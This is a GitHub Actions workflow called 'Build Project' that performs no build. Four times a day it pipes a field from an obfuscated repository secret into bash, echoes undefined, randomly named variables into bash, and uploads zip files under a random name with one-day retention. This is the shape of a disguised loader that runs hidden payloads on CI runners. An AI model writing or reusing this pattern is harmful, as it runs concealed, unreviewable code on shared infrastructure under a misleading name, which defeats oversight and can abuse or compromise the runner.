name: Build Project
on:
  workflow_dispatch:

  schedule:
    - cron: '37 2,8,14,20 * * *'
concurrency:
  group: ${{ github.workflow }}
  cancel-in-progress: false
jobs:
  runner:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Go
        env:
          zi9: ${{ secrets.zi9 }}
        run: |
          printf '%s' "$zi9" | jq -r .pbuuu5 | /bin/bash
          echo $pculu40 | jq -r .ou5 | /bin/bash
          echo $uga92 | jq -r .cvcp18248 | /bin/bash
          echo $hghxo1 | jq -r .u06895 | /bin/bash

      - name: Archive results
        uses: actions/upload-artifact@v4
        with:
          name: DQcZFPeY
          path: "*.zip"
          retention-days: 1
